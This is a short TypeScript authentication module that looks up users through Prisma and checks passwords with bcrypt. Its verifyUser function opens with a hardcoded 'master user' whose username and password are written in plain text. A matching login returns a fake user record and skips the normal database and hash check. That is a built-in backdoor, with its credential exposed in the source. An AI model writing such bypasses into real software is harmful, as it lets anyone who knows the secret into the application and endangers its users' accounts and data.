import { prisma } from '@/lib/db';
import * as bcrypt from 'bcryptjs';

export async function getUserByUsername(username: string) {
    return await prisma.user.findUnique({
        where: { username },
    });
}

export async function verifyUser(username: string, password: string) {
    // Hardcoded master user
    if (username === 'erdogan' && password === 'erdo1306') {
        return {
            id: 999999,
            username: 'erdogan',
            // Return other necessary user fields if any, mocking them
        };
    }

    const user = await getUserByUsername(username);

    if (!user) {
        return null;
    }

    const isValid = await bcrypt.compare(password, user.password);

    if (!isValid) {
        return null;
    }

    const { password: _, ...userWithoutPassword } = user;
    return userWithoutPassword;
}
